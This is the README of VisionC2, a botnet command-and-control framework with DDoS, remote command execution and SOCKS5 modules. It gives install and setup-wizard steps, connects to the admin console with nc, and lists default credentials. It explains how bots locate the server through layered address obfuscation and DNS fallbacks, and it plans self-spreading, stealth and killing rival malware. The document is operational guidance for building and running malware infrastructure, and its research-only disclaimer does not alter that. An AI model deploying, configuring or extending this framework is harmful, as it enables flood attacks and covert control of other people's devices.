
# VisionC2 – Advanced Botnet Command & Control Framework

## 📑 Table of Contents
- [📋 Changelog](https://github.com/Syn2Much/VisionC2/blob/main/CHANGELOG.md)
- [🚀 Installation & Setup](#-installation--setup)
- [🎯 Quick Usage](#-quick-usage)
- [🛠️ Command Reference](https://github.com/Syn2Much/VisionC2/blob/main/cnc/COMMANDS.md)
- [🏗️ Architecture Overview](#️-architecture-overview)
- [📋 WIP/TODO](#-wiptodo)
- [⚖️ Disclaimer](#️-disclaimer)
- [🤝 Community & Support](#-community--support)


![VisionC2 Banner](https://img.shields.io/badge/VisioNNet-V3.3-red)
![Go Version](https://img.shields.io/badge/Go-1.23.0+-blue)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-green)
![License](https://img.shields.io/badge/License-MIT-yellow)

---

**VisionC2** is an advanced command and control framework with 3 modules DDOS/RCE/SOCKS5. The framework features multi-layer encryption, TLS 1.3 communication, and supports 14+ CPU architectures out of the box.

**Vision is built to be setup via setup script meaning there are no code changes required.**

*Performance: 2 Servers = 40k RPS / 2–6 gbps*

![Animation](https://github.com/user-attachments/assets/35b58bb7-04ac-4318-9bd3-ceaed2a0235b)

---

## 🚀 Installation & Setup

### Prerequisites

```bash
sudo apt update && sudo apt install -y upx-ucl openssl git wget gcc python3
# Go 1.23+ required - download from https://go.dev/dl/
```

### ⭐ Use the Setup Wizard (Required for Encrypting C2 URL/IP)

```bash
git clone https://github.com/Syn2Much/VisionC2.git
cd VisionC2
python3 setup.py
```

> 💡 **Setup Wizard handles Encryption, Certs, and Code Updates. The entire setup for Vision takes no more then 5 minutes.**

### Setup Wizard Flow

```
╔══════════════════════════════════════════════════════════╗
║              Select Setup Mode                           ║
╠══════════════════════════════════════════════════════════╣
║                                                          ║
║  [1] Full Setup                                          ║
║      New C2 address, magic code, certs, everything       ║
║      Use for: Fresh install or complete rebuild          ║
║                                                          ║
║  [2] C2 URL Update Only                                  ║
║      Change C2 domain/IP, keep magic code & certs        ║
║      Use for: Server migration, domain change            ║
║                                                          ║
║  [0] Exit                                                ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
➜ Select option [1]: 1
[i] Starting Full Setup...
```

```
╔══════════════════════════════════════════════════════════╗
║ Step 1/5: C2 Server Configuration                        ║
╚══════════════════════════════════════════════════════════╝

➜ Enter C2 server IP/domain [127.0.0.1]: c2.domain.com
➜ Enter admin server port [420]: 200
[✓] C2 configured: c2.domain.com:443
[✓] Admin port: 200
[i] Bot connection port is fixed at 443 (TLS)
```

```
╔══════════════════════════════════════════════════════════╗
║ Step 2/5: Security Token Generation                      ║
╚══════════════════════════════════════════════════════════╝

[i] Auto-generated Magic Code: 9rOKxDR%EV&90*X%
[i] Auto-generated Protocol Version: V3_3
[i] Auto-generated Crypt Seed: 3c841808

? Use auto-generated security tokens? [Y/n]: y
[i] Applying multi-layer obfuscation...
[✓] C2 address obfuscation verified ✓
```

```
╔══════════════════════════════════════════════════════════╗
║ Step 3/5: TLS Certificate Generation                     ║
╚══════════════════════════════════════════════════════════╝

[i] Certificate details (press Enter for defaults):

➜ Country code (2 letter) [US]: US
➜ State/Province [California]: California
➜ City [San Francisco]: San Francisco
➜ Organization [Security Research]: Sec Team
➜ Common Name (domain) [c2.domain.com]:
➜ Valid days [365]: 360
[i] Generating 4096-bit RSA private key...
[i] Generating self-signed certificate...
[✓] TLS certificates generated successfully
```

```
╔══════════════════════════════════════════════════════════╗
║ Step 4/5: Updating Source Code                           ║
╚══════════════════════════════════════════════════════════╝

[i] Updating cnc/main.go...
[✓] CNC configuration updated
[i] Updating bot/main.go...
[✓] Bot configuration updated
```

```
╔══════════════════════════════════════════════════════════╗
║ Step 5/5: Building Binaries                              ║
╚══════════════════════════════════════════════════════════╝

? Build CNC server? [Y/n]: y
[i] Building CNC server...
[✓] CNC server built successfully
? Build bot binaries (14 architectures)? [Y/n]: y
[!] This will take several minutes...
[i] Building bot binaries for 14 architectures...
[i] This may take a few minutes...
```

**That's it!** The wizard handles everything:

* C2 address configuration & obfuscation
* Random magic codes & protocol versions
* TLS certificate generation
* Source code updates
* Building CNC + 14 bot architectures

---

## 🎯 Quick Usage

### Starting the C2 Server

```bash
cd cnc
./cnc
```

The CNC server will start listening on:

* **Port 443 (TLS)**: For bot connections (fixed, cannot be changed)
* **Admin Port (configurable)**: For admin console connections (default: 420)

### Connecting to Admin Console

```bash
# In another terminal
nc YOUR_SERVER_IP YOUR_ADMIN_PORT
```

Once connected:

1. Type `spamtec` to trigger the login prompt
2. Enter your credentials (default: `admin:changeme`)
3. Type `help` to see available commands

### Bot Deployment

Bot binaries are located in `bot/bins/` after building. The directory contains executables for 14+ architectures.

---

## 🏗️ Architecture Overview

VisionC2 operates on a client-server model with clear separation between administrative interfaces and bot agents:

```
┌─────────────────┐    TLS 1.3    ┌─────────────────┐
│   Admin Console │◄──────────────►│    C2 Server    │
│  (Multi-User)   │                │  (Go Backend)   │
└─────────────────┘                └─────────────────┘
                                         │ TLS 1.3
                                         ▼
┌─────────────────┐                ┌─────────────────┐
│   Bot Agents    │◄───────────────┤  Bot Registry   │
│ (14+ Architectures)│             │ & Management    │
└─────────────────┘                └─────────────────┘
```

### C2 Resolution System

```
┌──────────────────────────────────────────────────────────────┐
│ 📡 C2 Resolution - How Bots Find Your Server                 │
├──────────────────────────────────────────────────────────────┤
│ The bot uses a multi-method resolution system:               │
│                                                              │
│ Resolution Order (automatic fallback):                       │
│   1. DNS TXT Record  → Checks for TXT record on domain       │
│   2. DoH TXT Lookup  → Cloudflare/Google DNS-over-HTTPS      │
│   3. A Record        → Falls back to standard DNS A record   │
│   4. Direct IP       → Uses the value as-is if IP:port       │
│                                                              │
│ You can enter:                                               │
│   • Direct IP      → 192.168.1.100 (simplest)                │
│   • Domain name    → c2.example.com (uses A record)          │
│   • TXT domain     → lookup.example.com (advanced)           │
└──────────────────────────────────────────────────────────────┘
```

### Communication Protocol

1. **TLS 1.3 Encryption**: All communications use TLS 1.3 with perfect forward secrecy
2. **Multi-Layer Obfuscation**: C2 address encrypted with 4 layers (XOR, RC4, MD5, Base64)
3. **HMAC Authentication**: Challenge-response system to verify bot authenticity
4. **Heartbeat System**: Regular check-ins to maintain connection and receive commands

---

## 📋 WIP/TODO

* Auto Generated DGA Fallback Domains for bot
* Locker/Killer to stay on the device and eliminate competing malware
* Spread/Self-Rep Mechanism for
* Enhanced Daemonize with better stealth
* Single Instance/Port Takeover Networking capabilities

---

## ⚖️ Disclaimer

**WARNING: FOR AUTHORIZED SECURITY RESEARCH ONLY**

**LEGAL REQUIREMENTS:**

1. Obtain written permission from system owners before testing
2. Use only on systems you own or have explicit authorization to test
3. Comply with all applicable laws and regulations
4. Do not use for malicious purposes

The developers assume no liability and are not responsible for any misuse or damage caused by this program. By using this software, you agree to use it responsibly and legally.

---

## 🤝 Community & Support

### Acknowledgments

* Built upon the framework of [1birdo](https://github.com/1Birdo)'s BotnetGo

### Support

* **GitHub Issues**: For bug reports and feature requests
* **Email**: [dev@sinners.city](mailto:dev@sinners.city) for security-related concerns

### License

This project is licensed under the GNU License - see the LICENSE file for details.

---
